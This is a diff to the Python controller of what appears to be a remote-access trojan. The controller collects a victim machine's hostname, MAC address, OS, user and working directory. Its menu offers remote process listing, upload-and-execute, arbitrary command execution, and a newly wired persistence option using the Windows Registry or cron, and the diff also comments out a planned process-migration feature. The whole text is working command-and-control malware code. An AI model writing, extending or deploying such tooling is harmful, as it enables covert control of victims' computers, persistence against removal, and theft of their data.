@@ -22,11 +22,14 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
     hostname = handler.recv(BUFF_SIZE).decode()
     mac = handler.recv(BUFF_SIZE).decode()
-    opsys = handler.recv(BUFF_SIZE).decode()
+    family= handler.recv(BUFF_SIZE).decode()
+    release = handler.recv(BUFF_SIZE).decode()
     process = handler.recv(BUFF_SIZE).decode()
     pid = handler.recv(BUFF_SIZE).decode()
     user = handler.recv(BUFF_SIZE).decode()
     cwd = handler.recv(BUFF_SIZE).decode()
+
+    opsys = family + ' ' + release
 
     print("Remote machine Hostname: " + hostname)
     print("Remote machine IP: " + addr[0])
@@ -47,8 +50,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         print("\'5\' to retrieve a process list from the remote machine.")
         print("\'6\' to upload and execute file on remote machine.")
         print("\'7\' to run a command on the remote machine.")
-        print("\'8\' to migrate to a new process.")
-        print("\'9\' to enable persistence")
+        print("\'8\' to enable persistence")
         print("\'0\' to quit.")
         choice = int(input("Command: "))
 
@@ -103,7 +105,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
             proc = ''
 
-            while proc != 'done':
+            while proc != 'done':   # Not technically needed but useful in case something ets lost,
+                                    # tells server we're done.
                 proc = handler.recv(BUFF_SIZE).decode()
                 if proc != 'done':
                     print(proc)
@@ -135,11 +138,21 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             results = handler.recv(BUFF_SIZE).decode()
             print(cmd + '\n' + results)
 
-        elif choice == 8: # TODO Process Migration
-            exit()
+        # elif choice == 8:  # Migrate to a new process ** PLACEHOLDER ** TODO IMPLEMENT THIS
+        #    if family != 'Windows':
+        #        print("Error: Process Migration currently only available for Windows OS, current system is: " + family)
+        #
+        #   else:
+        #       handler.send('8'.encode())
+        #
+        #       pid = input("Enter PID of process to migrate to: ")
+        #       handler.send(pid.encode())'''
 
-        elif choice == 9: # TODO Persistence mechanisms
-            exit()
+        elif choice == 8:  # Persistence
+            handler.send('8'.encode())
+            print("Attempting to enable persistence via Registry (Windows) or Cron (*nix)...")
+            status = handler.recv(BUFF_SIZE).decode()
+            print(status)
 
         elif choice == 0:
             print("Exiting. Have a nice day.")
